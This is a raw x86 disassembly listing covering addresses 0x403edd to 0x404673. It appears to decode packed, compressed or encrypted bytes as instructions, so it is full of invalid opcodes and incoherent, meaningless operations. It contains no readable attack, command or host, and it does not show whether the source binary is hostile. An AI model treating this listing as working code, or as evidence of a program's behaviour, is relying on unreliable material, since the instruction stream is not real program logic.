  403edd:	inc    ebx
  403ede:	popa   
  403edf:	jae    0x403f55
  403ee1:	outs   dx,DWORD PTR ds:[esi]
  403ee2:	push   esi
  403ee3:	sbb    al,0x5b
  403ee5:	pop    edx
  403ee6:	pop    ds
  403ee7:	cmp    DWORD PTR [esi+edx*2+0x43450d1c],0x24b64a25
  403ef2:	sbb    DWORD PTR [ecx-0x29],ebp
  403ef5:	pop    ebx
  403ef6:	js     0x403ece
  403ef8:	pop    eax
  403efa:	sbb    BYTE PTR [eax-0x35],bh
  403efd:	adc    BYTE PTR [ebp+0x41],al
  403f00:	arpl   WORD PTR [edi-0xa45098e],ax
  403f06:	jae    0x403f7b
  403f08:	push   esi
  403f09:	mov    BYTE PTR [ecx+eiz*2-0x73],ch
  403f0d:	mov    ebx,0xd20578d8
  403f12:	push   eax
  403f13:	fsubr  DWORD PTR [ebx]
  403f15:	push   eax
  403f16:	jb     0x403f3a
  403f18:	mov    ecx,0x6c78ed2d
  403f1d:	gs jecxz 0x403eb0
  403f20:	push   edi
  403f21:	push   edi
  403f22:	xor    bh,bl
  403f24:	pusha  
  403f25:	add    al,0xf2
  403f27:	push   edi
  403f28:	xor    BYTE PTR [edi+0x63617453],ch
  403f2e:	inc    ebx
  403f2f:	leave  
  403f30:	aaa    
  403f31:	mov    WORD PTR [ebx-0x80],gs
  403f34:	pop    ebx
  403f35:	mov    WORD PTR [ecx+eiz*4+0x43020561],cs
  403f3c:	outs   dx,DWORD PTR ds:[esi]
  403f3d:	je     0x403fa9
  403f3f:	xchg   BYTE PTR [edx+0x436c70cd],dl
  403f45:	imul   edx,DWORD PTR [edi-0x1c],0xffffffe4
  403f49:	xchg   edi,eax
  403f4a:	cld    
  403f4b:	sub    edx,DWORD PTR [eax]
  403f4d:	(bad)  
  403f4e:	push   esi
  403f4f:	popa   
  403f50:	jb     0x403fbb
  403f52:	popa   
  403f53:	outs   dx,BYTE PTR ds:[esi]
  403f54:	pop    eax
  403f55:	inc    esi
  403f56:	and    BYTE PTR [edi],ch
  403f58:	mov    dl,0x40
  403f5a:	pop    ebx
  403f5b:	pop    eax
  403f5c:	inc    eax
  403f5d:	fsub   st,st(0)
  403f5f:	sub    BYTE PTR [eax],bl
  403f61:	mov    esp,0x6146c122
  403f67:	inc    ebx
  403f68:	leave  
  403f69:	jbe    0x403fd3
  403f6b:	outs   dx,BYTE PTR ds:[esi]
  403f6c:	fs (bad) 
  403f6e:	pop    edi
  403f6f:	mov    al,ds:0x472c6ca0
  403f74:	and    BYTE PTR [esi],cl
  403f76:	(bad)  
  403f77:	fdiv   DWORD PTR [edx-0x5f]
  403f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7b:	cmp    ebp,DWORD PTR [ebx]
  403f7d:	jb     0x403f3b
  403f7f:	nop
  403f80:	pop    ebx
  403f81:	cld    
  403f82:	push   ebx
  403f83:	add    ebp,DWORD PTR [ebx]
  403f85:	nop
  403f86:	cld    
  403f87:	stos   DWORD PTR es:[edi],eax
  403f88:	data16 cmp BYTE PTR [esi+0x24],bl
  403f8c:	icebp  
  403f8d:	mov    al,0x5b
  403f8f:	pop    ecx
  403f90:	pop    eax
  403f91:	(bad)  
  403f92:	pop    ecx
  403f93:	pop    eax
  403f94:	les    esi,FWORD PTR [esi-0x5cf7bf72]
  403f9a:	push   ebx
  403f9b:	push   ebp
  403f9c:	mov    al,0xa1
  403f9e:	cmp    ecx,DWORD PTR fs:[edi]
  403fa1:	push   edi
  403fa2:	mov    al,0xb0
  403fa4:	mov    bl,0x21
  403fa6:	call   DWORD PTR [edx]
  403fa8:	and    eax,edi
  403faa:	push   ebx
  403fab:	popa   
  403fac:	data16 arpl WORD PTR gs:[ecx+0x6c],sp
  403fb1:	cmp    DWORD PTR [ecx-0x37a6c01e],esp
  403fb7:	adc    DWORD PTR [ebx],eax
  403fb9:	cs aaa 
  403fbb:	xor    al,0x4
  403fbd:	aaa    
  403fbe:	dec    eax
  403fbf:	fwait
  403fc0:	loope  0x403f78
  403fc2:	sbb    al,0x0
  403fc4:	or     BYTE PTR [ebp+0x22],dl
  403fc7:	ins    BYTE PTR es:[edi],dx
  403fc8:	jae    0x403fbd
  403fca:	and    ebp,esp
  403fcc:	sbb    DWORD PTR [eax-0x70],ebp
  403fcf:	xor    al,0x38
  403fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fd2:	inc    edx
  403fd3:	pop    ecx
  403fd4:	arpl   WORD PTR [edi],cx
  403fd6:	icebp  
  403fd7:	and    al,0x18
  403fd9:	pop    edx
  403fda:	(bad)  
  403fdb:	dec    BYTE PTR [ecx]
  403fdd:	xor    dl,bl
  403fdf:	pop    ds
  403fe0:	inc    esp
  403fe1:	dec    ebx
  403fe2:	test   al,0x20
  403fe4:	adc    edx,DWORD PTR [esp+edx*2+0x68]
  403fe8:	jb     0x403f9a
  403fea:	jno    0x403f94
  403fec:	test   ebp,esp
  403fee:	fs (bad) 
  403ff0:	loop   0x404067
  403ff2:	jns    0x403faa
  403ff4:	mov    ds:0x83cc033f,eax
  403ff9:	rcl    ah,0xc2
  403ffc:	stos   DWORD PTR es:[edi],eax
  403ffd:	xchg   esp,eax
  403ffe:	pop    es
  403fff:	lods   al,BYTE PTR ds:[esi]
  404000:	add    al,0xd
  404002:	adc    eax,0x98aa3d83
  404007:	pop    ss
  404008:	inc    esp
  404009:	out    0xd4,eax
  40400b:	cs jb  0x403fd6
  40400e:	and    esp,edx
  404010:	aam    0x7f
  404012:	call   0xa303:0x99ba69a6
  404019:	lods   eax,DWORD PTR ds:[esi]
  40401a:	jns    0x403f9d
  40401c:	mov    esi,edi
  40401e:	jg     0x404009
  404020:	imul   edx,DWORD PTR [ecx+0x7b7552c3],0xffffff8f
  404027:	sbb    eax,0xdf9c4cdb
  40402c:	push   edi
  40402d:	loopne 0x4040a0
  40402f:	sbb    DWORD PTR ds:0x93bac23f,edi
  404035:	in     eax,dx
  404036:	pop    ss
  404037:	mov    eax,0x405bbb2c
  40403c:	paddq  mm3,mm3
  40403f:	sub    bl,dh
  404041:	lods   al,BYTE PTR ds:[esi]
  404042:	mov    dh,0x1f
  404044:	xor    BYTE PTR [ecx+0x5b],cl
  404047:	clc    
  404048:	pop    es
  404049:	adc    dh,bl
  40404b:	stos   BYTE PTR es:[edi],al
  40404c:	adc    BYTE PTR [esp+edx*2],ah
  40404f:	dec    ebp
  404050:	jne    0x4040be
  404052:	ds push edx
  404054:	ficom  WORD PTR [esi-0x46]
  404057:	jne    0x403fdc
  404059:	nop
  40405a:	ins    BYTE PTR es:[edi],dx
  40405b:	jne    0x4040d0
  40405d:	je     0x4040c4
  40405f:	push   edi
  404060:	ins    BYTE PTR es:[edi],dx
  404061:	loope  0x4040cd
  404063:	pop    ss
  404064:	fiadd  DWORD PTR [ebp-0xa9c91aa]
  40406a:	popf   
  40406b:	imul   edi,DWORD PTR [edx-0x14],0x2cc54bfd
  404072:	addr16 sub al,dl
  404075:	shr    edx,0x10
  404078:	div    bx
  40407b:	js     0x40404e
  40407d:	not    BYTE PTR [esi]
  40407f:	xor    al,0x66
  404081:	mov    DWORD PTR [ecx],eax
  404083:	add    dl,BYTE PTR [ebx]
  404085:	pop    ds
  404086:	mov    esp,0x5083c573
  40408b:	addr16 pop es
  40408d:	retf   
  40408e:	mov    dl,0x1
  404090:	mov    eax,ds:0xc22ed43
  404095:	(bad)  
  404096:	mov    edi,0x99bcac93
  40409b:	sub    cl,BYTE PTR [eax+0x41]
  40409e:	push   0x3b150c6b
  4040a3:	mov    BYTE PTR [edi-0x53],al
  4040a6:	js     0x4040db
  4040a8:	leave  
  4040a9:	lds    ebp,FWORD PTR [eax+0x23d4e085]
  4040af:	(bad)  
  4040b0:	daa    
  4040b1:	inc    esi
  4040b2:	mov    al,ds:0xfaaf4677
  4040b7:	sbb    al,0x89
  4040b9:	fcomp  DWORD PTR [ebp+0x5]
  4040bc:	ret    
  4040bd:	sub    dl,dl
  4040bf:	cmp    al,BYTE PTR [edi]
  4040c1:	push   0x23
  4040c3:	dec    esp
  4040c4:	add    DWORD PTR [ebx-0x5c],eax
  4040c7:	and    DWORD PTR [edx],eax
  4040c9:	(bad)  
  4040ca:	lods   eax,DWORD PTR ds:[esi]
  4040cb:	aaa    
  4040cc:	outs   dx,BYTE PTR ds:[esi]
  4040cd:	mov    al,BYTE PTR [eax]
  4040cf:	cmp    al,0xf
  4040d1:	push   es
  4040d2:	cmp    al,0x7a
  4040d4:	ja     0x4040d8
  4040d6:	sub    al,0x20
  4040d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d9:	jmp    0xff02:0x88e1bbb6
  4040e0:	adc    al,0xff
  4040e2:	pop    ds
  4040e3:	dec    ebx
  4040e4:	test   al,0xc
  4040e6:	test   ebp,eax
  4040e8:	test   al,0xdf
  4040ea:	jp     0x40413b
  4040ec:	inc    ecx
  4040ed:	and    dl,BYTE PTR [edx-0x38]
  4040f0:	rcr    BYTE PTR [edx+0x4],cl
  4040f3:	and    al,BYTE PTR [esi+0xa]
  4040f6:	inc    esi
  4040f7:	mov    edx,0xff091109
  4040fc:	sub    eax,0x52f26fe2
  404101:	cld    
  404102:	mov    ecx,eax
  404104:	cmp    ecx,edx
  404106:	jbe    0x404119
  404108:	cmp    ecx,ecx
  40410a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40410c:	je     0x404116
  40410e:	movzx  edx,BYTE PTR [ecx+0x19]
  404112:	mov    bl,bl
  404114:	inc    esi
  404115:	inc    DWORD PTR [ebx]
  404117:	push   edi
  404118:	(bad)  
  404119:	cli    
  40411a:	add    bh,al
  40411c:	push   eax
  40411d:	(bad)  
  40411e:	rcl    DWORD PTR [ebx+0x30],cl
  404121:	sub    cl,BYTE PTR [edx+0x9bff5e]
  404127:	pop    edx
  404128:	imul   ecx,DWORD PTR [edx+0x8],0x4
  40412c:	leave  
  40412d:	dec    edi
  40412e:	mov    bh,BYTE PTR [edi-0x25]
  404131:	(bad)  
  404132:	rep ins BYTE PTR es:[edi],dx
  404134:	ud0    edi,edi
  404137:	out    dx,eax
  404138:	and    BYTE PTR [eax],bh
  40413a:	sti    
  40413b:	je     0x404115
  40413d:	push   eax
  40413e:	ret    
  40413f:	push   ebx
  404140:	mov    edx,0xd77ce22d
  404145:	sub    eax,edx
  404147:	pop    ebx
  404148:	cmp    BYTE PTR [ecx],bl
  40414a:	push   eax
  40414b:	pop    ss
  40414c:	sbb    dh,BYTE PTR [ebp+0x21]
  40414f:	call   0x3bd155a1
  404154:	dec    edx
  404155:	xchg   ebp,eax
  404156:	test   DWORD PTR [edx+0x5c9e2972],ecx
  40415c:	xchg   esp,eax
  40415d:	cmp    edi,DWORD PTR [edx-0x14bf9f50]
  404163:	hlt    
  404164:	(bad)  
  404165:	bound  ebx,QWORD PTR [eax]
  404167:	ror    BYTE PTR [edi],1
  404169:	mov    ah,0x8b
  40416b:	ror    BYTE PTR [esi-0x4f],1
  40416e:	sub    edx,ebx
  404170:	and    eax,0xff5309a9
  404175:	jg     0x4041c3
  404177:	cmp    BYTE PTR ds:0x8b409876,cl
  40417d:	mov    esp,0x17c95032
  404182:	add    DWORD PTR [edx-0x3cf011cf],0xffffffb5
  404189:	xor    edi,DWORD PTR [ecx]
  40418b:	xor    BYTE PTR [esp+edi*2],0xc
  40418f:	dec    edx
  404190:	mov    BYTE PTR [ecx+eax*4],cl
  404193:	mov    ecx,0x37381302
  404198:	add    DWORD PTR [ebp-0x297bc9c6],ecx
  40419e:	and    DWORD PTR [ebp+0x78],ebx
  4041a1:	inc    eax
  4041a2:	imul   ebx,DWORD PTR [edi],0x16
  4041a5:	lds    edx,FWORD PTR [eax+eax*8-0x77415ed]
  4041ac:	stos   BYTE PTR es:[edi],al
  4041ad:	mov    esp,0x3c047fff
  4041b2:	lock mov ebx,0x3b4301da
  4041b8:	repz jl 0x4041c2
  4041bb:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  4041c0:	jbe    0x4041e6
  4041c2:	call   0xb34b8a2
  4041c7:	jge    0x4041d3
  4041c9:	mov    eax,ebp
  4041cb:	dec    edx
  4041cc:	pop    ss
  4041cd:	dec    esi
  4041ce:	adc    al,0x63
  4041d0:	test   DWORD PTR [edi-0x33],ebp
  4041d3:	aaa    
  4041d4:	clc    
  4041d5:	xor    eax,0x41cb2bce
  4041da:	fnstsw WORD PTR [eax]
  4041dc:	xor    dl,BYTE PTR [edi]
  4041de:	push   ds
  4041df:	test   BYTE PTR [edx-0x36f774ec],cl
  4041e5:	jne    0x404212
  4041e7:	sar    BYTE PTR [ecx-0x2d],0xff
  4041eb:	sbb    eax,0x16f70ec4
  4041f0:	pop    esi
  4041f1:	cs mov al,0x2d
  4041f4:	inc    ecx
  4041f5:	dec    esi
  4041f6:	mov    BYTE PTR [esi],al
  4041f8:	ret    
  4041f9:	mov    ecx,0xdfb75e0a
  4041fe:	mov    dh,bh
  404200:	push   esi
  404201:	xor    edx,edx
  404203:	div    ecx
  404205:	dec    esi
  404206:	inc    DWORD PTR [eax+0x3723afa]
  40420c:	pop    es
  40420d:	pop    es
  40420e:	mov    bh,bh
  404210:	pop    ss
  404211:	ss test al,0x16
  404214:	fsubp  st(2),st
  404216:	in     al,dx
  404217:	sub    ecx,esi
  404219:	sub    edx,ecx
  40421b:	jbe    0x40422d
  40421d:	add    ecx,edx
  40421f:	mov    al,0x30
  404221:	imul   edi,edi,0xffffffdd
  404224:	jmp    FWORD PTR [ecx]
  404226:	(bad)  
  404227:	jmp    0x40422c
  404229:	mov    BYTE PTR [edx+esi*1],al
  40422c:	dec    edx
  40422d:	jne    0x404229
  40422f:	xor    eax,0x83e68956
  404234:	in     al,dx
  404235:	adc    BYTE PTR [ecx],dh
  404237:	leave  
  404238:	push   edx
  404239:	aaa    
  40423a:	dec    esp
  40423b:	mov    BYTE PTR [eax],cl
  40423d:	or     edx,eax
  40423f:	lea    ebx,[eax+0x4d]
  404242:	push   esp
  404243:	ins    BYTE PTR es:[edi],dx
  404244:	mov    al,0x5
  404246:	sbb    DWORD PTR [esi+0x6b],ebx
  404249:	xor    BYTE PTR [ecx-0x1e],bl
  40424c:	inc    DWORD PTR [ecx+0x22d5bc0a]
  404252:	push   DWORD PTR [eax+0x4]
  404255:	push   DWORD PTR [eax]
  404257:	mov    eax,esp
  404259:	test   DWORD PTR [eax+0x35],0x53f20b47
  404260:	pop    ss
  404261:	inc    edx
  404262:	cmc    
  404263:	(bad)  
  404264:	scas   eax,DWORD PTR es:[edi]
  404265:	xchg   edx,eax
  404266:	cmp    DWORD PTR [eax+0x4e2d26c6],edi
  40426c:	inc    ecx
  40426d:	outs   dx,DWORD PTR ds:[si]
  40426f:	std    
  404270:	mov    edi,0x45153b5
  404275:	fnstcw WORD PTR [esp+0x2]
  404279:	fnstcw WORD PTR [esp]
  40427c:	or     WORD PTR [esi*4+0x472cd90f],0xbb0e
  404286:	ins    BYTE PTR es:[edi],dx
  404287:	or     BYTE PTR [ecx+0x2744e8d9],cl
  40428d:	and    DWORD PTR [ebx+edi*8-0x79],0xda3a6aed
  404295:	jg     0x4042ff
  404297:	add    al,0xff
  404299:	fild   QWORD PTR [esp+0x8]
  40429d:	fild   QWORD PTR [ebp*8-0x27822049]
  4042a4:	ret    0xc1de
  4042a7:	sub    bl,0x2
  4042aa:	fild   QWORD PTR [eax]
  4042ac:	fild   WORD PTR [esi+esi*1]
  4042af:	ror    DWORD PTR [esi-0x27],0xf8
  4042b3:	fild   QWORD PTR [esi+0x35]
  4042b6:	fisub  DWORD PTR [ebp-0x75062320]
  4042bc:	(bad)  [eax]
  4042be:	cmp    al,0xd7
  4042c0:	iret   
  4042c1:	push   esp
  4042c2:	(bad)  
  4042c4:	mov    dh,0xd6
  4042c6:	push   es
  4042c7:	push   ss
  4042c8:	fcom   st(3)
  4042ca:	fstsw  ax
  4042cd:	sahf   
  4042ce:	jae    0x4042b1
  4042d0:	fnstenv ds:0xfd9e5c02
  4042d6:	das    
  4042d7:	(bad)  
  4042d8:	ffree  st(3)
  4042da:	ffree  st(2)
  4042dc:	ffree  st(1)
  4042de:	ffree  st(0)
  4042e0:	pop    ecx
  4042e1:	jmp    0xd8cb:0xd101d629
  4042e8:	mov    DWORD PTR [esi+0x5020eee3],edx
  4042ee:	pop    edi
  4042ef:	repnz xor eax,0xf108ef50
  4042f5:	test   BYTE PTR [eax],ah
  4042f7:	pop    esi
  4042f8:	pop    ebp
  4042f9:	pusha  
  4042fa:	mov    BYTE PTR [eax+0x10],ch
  4042fd:	push   ds
  4042fe:	ja     0x4042e1
  404300:	shl    DWORD PTR [ebx+0x20027bb6],0x2b
  404307:	push   ecx
  404308:	mov    ecx,0x8a3a1b5a
  40430d:	xchg   ecx,eax
  40430e:	and    DWORD PTR [eax],esp
  404310:	push   ebx
  404311:	es aam 0x28
  404314:	push   ds
  404315:	ror    BYTE PTR [ecx+0x319d82f8],0xce
  40431c:	fimul  DWORD PTR [edi]
  40431e:	pop    edx
  40431f:	adc    edx,DWORD PTR [ecx+0x8]
  404322:	aam    0xc
  404324:	or     bh,al
  404326:	fistp  DWORD PTR [ecx+ecx*4]
  404329:	push   es
  40432a:	push   ds
  40432b:	or     al,0xb
  40432d:	icebp  
  40432e:	and    BYTE PTR [esi],ch
  404330:	shl    ch,1
  404332:	push   edi
  404333:	cmp    BYTE PTR [edi+edi*4-0x78],0xb7
  404338:	shl    eax,1
  40433a:	sub    DWORD PTR [edi-0x48],eax
  40433d:	pmuludq mm1,QWORD PTR [ebx+0x414d7315]
  404344:	pop    es
  404345:	pinsrw mm7,WORD PTR [eax-0x6d82fcc],0x1e
  40434d:	jne    0x40436a
  40434f:	mov    edx,0x11546011
  404354:	test   BYTE PTR ss:[esi],cl
  404357:	in     al,0x92
  404359:	and    DWORD PTR [eax+ebp*8+0x14562184],eax
  404360:	jns    0x4043c6
  404362:	sbb    esi,DWORD PTR [edi-0x1a]
  404365:	mov    eax,DWORD PTR [ecx]
  404367:	lock push esp
  404369:	jb     0x40431a
  40436b:	syscall 
  40436d:	or     bl,BYTE PTR [esi-0x7d]
  404370:	push   ss
  404371:	sbb    BYTE PTR [ebp+0x10],bl
  404374:	cmp    bl,0xdb
  404377:	(bad)  
  404378:	or     edx,DWORD PTR [edi-0x3a]
  40437b:	inc    ebp
  40437c:	dec    DWORD PTR [ecx-0xe]
  40437f:	test   esi,esi
  404381:	jl     0x4043a3
  404383:	inc    esi
  404384:	mov    esp,0xd16e5b1d
  404389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40438a:	fisttp WORD PTR [ebx-0x4fa2e9ed]
  404390:	push   es
  404391:	sbb    eax,0xba01f68e
  404396:	add    ebx,ebp
  404398:	push   es
  404399:	xor    ah,bl
  40439b:	mov    cl,BYTE PTR [ebx]
  40439d:	mov    al,BYTE PTR [ecx+0x2a]
  4043a0:	js     0x4043a2
  4043a2:	stos   DWORD PTR es:[edi],eax
  4043a3:	stos   DWORD PTR es:[edi],eax
  4043a4:	sbb    eax,0xdaaadea3
  4043a9:	bound  ecx,QWORD PTR [ebp+0x7143f055]
  4043af:	js     0x40438c
  4043b1:	fild   WORD PTR [eax]
  4043b3:	sub    BYTE PTR [edi+0x6ddb1198],dl
  4043b9:	lock fcomp DWORD PTR ds:0xbb26615f
  4043c0:	sti    
  4043c1:	xchg   BYTE PTR [eax],ch
  4043c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c4:	setne  BYTE PTR [ebx]
  4043c7:	jmp    0x404412
  4043c9:	sbb    ebx,DWORD PTR [edi-0x28]
  4043cc:	push   ebp
  4043cd:	jmp    DWORD PTR [eax-0x25]
  4043d0:	arpl   WORD PTR [edi],bx
  4043d2:	(bad)  
  4043d3:	or     esp,DWORD PTR es:[eax+0x68]
  4043d7:	pop    ecx
  4043d8:	xor    eax,DWORD PTR ds:0x216603c6
  4043de:	add    esi,DWORD PTR [edx]
  4043e0:	and    BYTE PTR [ebx+0x22],ah
  4043e3:	test   BYTE PTR [ebx+eax*1+0x2b602cd8],al
  4043ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043eb:	ret    0xcf7f
  4043ee:	xor    ebx,DWORD PTR gs:[eax+0x73]
  4043f2:	add    DWORD PTR [eax],esi
  4043f4:	or     eax,DWORD PTR [edx]
  4043f6:	sub    eax,0x2bac4131
  4043fb:	dec    ebp
  4043fc:	(bad)  
  4043fd:	icebp  
  4043fe:	xor    DWORD PTR [edi+esi*2],ebp
  404401:	loope  0x4043ba
  404403:	push   eax
  404404:	pop    ebx
  404405:	xlat   BYTE PTR ds:[ebx]
  404406:	adc    edx,edi
  404408:	adc    eax,0x1b128b71
  40440d:	and    DWORD PTR [eax],0x24eb1d83
  404413:	adc    BYTE PTR [ebx+edx*8-0x3ea92d13],al
  40441a:	inc    edi
  40441b:	mov    dh,BYTE PTR [edx+0x14]
  40441e:	xchg   ebp,eax
  40441f:	push   ss
  404420:	aas    
  404421:	stos   DWORD PTR es:[edi],eax
  404422:	(bad)  
  404423:	fadd   DWORD PTR [ecx+0x2c]
  404426:	adc    al,0x3b
  404428:	clc    
  404429:	or     eax,0xffffffff
  40442c:	or     eax,0x8bffd2f7
  404431:	repz and esi,0x3
  404435:	cmp    esi,0x2
  404438:	ja     0x404479
  40443a:	cwde   
  40443b:	and    edx,0xd02f6bf0
  404441:	ss test bl,ch
  404444:	inc    eax
  404445:	ja     0x404479
  404447:	inc    esi
  404448:	jl     0x4044b4
  40444a:	add    ecx,DWORD PTR [eax]
  40444c:	push   0x3b55af50
  404451:	push   ss
  404452:	push   eax
  404453:	push   esi
  404454:	mov    bl,0xed
  404456:	push   ss
  404457:	test   BYTE PTR [ebp+0x7504045],al
  40445d:	mov    ch,0x34
  40445f:	cmp    esi,DWORD PTR [ebp-0x38365137]
  404465:	mov    ds:0x8fa0984a,eax
  40446a:	addr16 add al,0x87
  40446d:	cmp    DWORD PTR [edx],eax
  40446f:	rol    BYTE PTR [eax],0xc0
  404472:	aaa    
  404473:	adc    al,0x1f
  404475:	mov    ds:0x61fb2664,al
  40447a:	in     al,0xc
  40447c:	push   0x6
  40447e:	and    edx,edi
  404480:	push   ecx
  404481:	nop
  404482:	sub    DWORD PTR [esi],esi
  404484:	cmp    ebx,DWORD PTR [edx]
  404486:	aad    0xa7
  404488:	cmovnp esp,DWORD PTR [eax+0x7]
  40448c:	(bad)  
  40448d:	sahf   
  40448e:	or     esp,eax
  404490:	xchg   ebp,eax
  404491:	sbb    edi,ebx
  404493:	jns    0x4044ed
  404495:	inc    ecx
  404496:	add    BYTE PTR [ecx],bh
  404498:	ret    0x982b
  40449b:	fldcw  WORD PTR [edx]
  40449d:	pop    eax
  40449e:	inc    edx
  40449f:	xchg   ebx,eax
  4044a0:	popf   
  4044a1:	or     BYTE PTR [esp+edx*4],dl
  4044a4:	stos   BYTE PTR es:[edi],al
  4044a5:	loope  0x4044b3
  4044a7:	iret   
  4044a8:	push   esi
  4044a9:	cmp    BYTE PTR [eax],0x1
  4044ac:	(bad)  
  4044ad:	in     al,dx
  4044ae:	push   0x39
  4044b0:	xor    BYTE PTR [edx*2+0x2874ec6c],0x0
  4044b8:	sub    DWORD PTR [edi+0x4ac380],ebx
  4044be:	pop    ds
  4044bf:	pop    eax
  4044c0:	mov    cl,0xe8
  4044c2:	test   al,0x1
  4044c4:	dec    edx
  4044c5:	pop    eax
  4044c6:	add    al,cl
  4044c8:	and    BYTE PTR [ebx-0x65fe40b7],ch
  4044ce:	sbb    DWORD PTR [eax],eax
  4044d0:	and    eax,0x297eff56
  4044d5:	mov    bl,BYTE PTR [esi+edi*1+0x3e]
  4044d9:	add    al,0xae
  4044db:	xchg   bh,bh
  4044dd:	xchg   ebx,eax
  4044de:	sbb    al,0xdf
  4044e0:	push   0x64
  4044e2:	fdiv   st(5),st
  4044e4:	(bad)  
  4044e5:	add    BYTE PTR ds:[edi],bl
  4044e8:	xlat   BYTE PTR ds:[ebx]
  4044e9:	cs fwait
  4044eb:	test   BYTE PTR [edx+eax*1],bh
  4044ee:	jne    0x4044f6
  4044f0:	dec    edi
  4044f1:	dec    edi
  4044f2:	pusha  
  4044f3:	xor    BYTE PTR [ebx-0x2880d748],al
  4044f9:	mov    dl,0x3
  4044fb:	cdq    
  4044fc:	push   0x17
  4044fe:	(bad)
  404501:	add    BYTE PTR [ebx+0x1f],ah
  404504:	scas   eax,DWORD PTR es:[edi]
  404505:	or     eax,0xf05c12e0
  40450a:	push   edi
  40450b:	idiv   BYTE PTR [ecx+0x19e30140]
  404511:	js     0x40456f
  404513:	and    al,0x29
  404515:	pop    es
  404516:	aam    0x4d
  404518:	and    cl,dh
  40451a:	pop    esp
  40451b:	cmp    bh,BYTE PTR [ebx-0x75]
  40451e:	push   esp
  40451f:	pusha  
  404520:	cs pusha 
  404522:	adc    edx,DWORD PTR [esi-0x4c9897b0]
  404528:	push   ebp
  404529:	daa    
  40452a:	push   0x97c8b863
  40452f:	push   eax
  404530:	or     al,0x89
  404532:	mov    BYTE PTR [edx],ah
  404534:	outs   dx,BYTE PTR ds:[esi]
  404535:	rol    BYTE PTR [ecx],0x19
  404538:	xchg   bl,bh
  40453a:	push   ss
  40453b:	icebp  
  40453c:	push   edx
  40453d:	cmp    eax,0x9dcba614
  404542:	in     al,0xd2
  404544:	dec    esi
  404545:	or     BYTE PTR [esi-0x40],al
  404548:	push   eax
  404549:	jnp    0x404571
  40454b:	in     al,0x8a
  40454d:	(bad)  
  40454e:	pop    ds
  40454f:	(bad)  
  404550:	dec    eax
  404551:	loopne 0x404595
  404553:	cld    
  404554:	imul   DWORD PTR [ebp-0x8]
  404557:	inc    esp
  404558:	pop    edx
  404559:	sub    eax,DWORD PTR [ecx+0x18]
  40455c:	dec    ebp
  40455d:	jecxz  0x404583
  40455f:	or     bl,BYTE PTR [edi]
  404561:	mov    eax,ds:0xe856a068
  404566:	jp     0x4045a1
  404568:	xor    al,0x8b
  40456a:	dec    ebp
  40456b:	xor    dl,BYTE PTR [ebx]
  40456d:	les    ecx,FWORD PTR [ebx]
  40456f:	pop    esp
  404570:	add    DWORD PTR [ecx-0x49e645af],ecx
  404576:	pop    esp
  404577:	xor    eax,0x8b1f1099
  40457c:	adc    BYTE PTR ds:0xf161ad14,dh
  404582:	outs   dx,BYTE PTR ds:[esi]
  404583:	inc    ebp
  404584:	sbb    BYTE PTR [ebp-0x41],al
  404587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404588:	enter  0xb48b,0xc7
  40458c:	jmp    0x6dc2:0x5e5832ff
  404593:	jae    0x40454d
  404595:	rcl    BYTE PTR [ebx+0x51d789c8],1
  40459b:	adc    DWORD PTR [eax],edx
  40459d:	mov    eax,ds:0x6a925068
  4045a2:	ficom  DWORD PTR [edi]
  4045a4:	and    ecx,0xcb88ea77
  4045aa:	daa    
  4045ab:	inc    esi
  4045ac:	and    edx,ebx
  4045ae:	and    bl,ch
  4045b0:	add    eax,0x8507bd2
  4045b5:	call   0x8a0b6fb8
  4045ba:	test   DWORD PTR [ecx-0xc26be2a],0x45b38085
  4045c4:	xchg   ebp,eax
  4045c5:	fxtract 
  4045c7:	xor    cl,BYTE PTR [eax+0x6]
  4045ca:	hlt    
  4045cb:	pop    ebx
  4045cc:	pop    esi
  4045cd:	pop    edi
  4045ce:	ret    
  4045cf:	repz in al,0x2
  4045d2:	push   ds
  4045d3:	adc    DWORD PTR ss:[esi-0x3a],ebx
  4045d7:	pop    ecx
  4045d8:	call   0xd433:0x8bf9738
  4045df:	adc    ebx,DWORD PTR [edi-0x29]
  4045e2:	mov    esi,eax
  4045e4:	xor    eax,eax
  4045e6:	or     edx,DWORD PTR [edi+edx*2-0x6a]
  4045ea:	or     DWORD PTR [edi],ebp
  4045ec:	pop    esp
  4045ed:	(bad)  [ecx]
  4045ef:	shl    BYTE PTR [ecx+edx*8+0x60],cl
  4045f3:	adc    edi,ebp
  4045f5:	and    DWORD PTR [edx-0x61833afa],ecx
  4045fb:	gs mov edx,edi
  4045fe:	push   edi
  4045ff:	cli    
  404600:	cli    
  404601:	jmp    0xf04b:0xbc053520
  404608:	je     0x4045e5
  40460a:	jo     0x404633
  40460c:	int3   
  40460d:	mov    cl,0x3b
  40460f:	add    BYTE PTR [ebp-0x7bf31416],bh
  404615:	push   eax
  404616:	or     DWORD PTR [edx],ecx
  404618:	jmp    FWORD PTR [ebx-0x21]
  40461b:	mov    ds:0x3ab05544,al
  404620:	shl    BYTE PTR [ebp-0x14],1
  404623:	pop    es
  404624:	ret    
  404625:	adc    eax,edx
  404627:	je     0x40465a
  404629:	adc    al,BYTE PTR [eax+eax*2-0x5]
  40462d:	fbld   TBYTE PTR [edx-0x33]
  404630:	scas   eax,DWORD PTR es:[edi]
  404631:	leave  
  404632:	clc    
  404633:	push   0xfffffff7
  404635:	ror    DWORD PTR [ecx+0x74],1
  404638:	cs mov esi,ecx
  40463b:	mov    edi,ebx
  40463d:	cvtps2pi mm6,QWORD PTR [esi+0x76ed240b]
  404644:	sbb    eax,0x46748d0e
  404649:	aam    0xde
  40464b:	ins    DWORD PTR es:[edi],dx
  40464c:	fisubr WORD PTR [edx+ebp*8+0x57c88911]
  404653:	lea    edi,[esi+eiz*8-0x6b748176]
  40465a:	jne    0x404649
  40465c:	lea    eax,[edi-0x1]
  40465f:	popf   
  404660:	jecxz  0x4046a3
  404662:	enter  0x1855,0x9b
  404666:	mov    edi,0xae4e0aad
  40466b:	mov    BYTE PTR [ecx+0x60d82797],cl
  404671:	add    al,0x9d
  404673:	les    ebx,FWORD PTR [edi+0x1d]
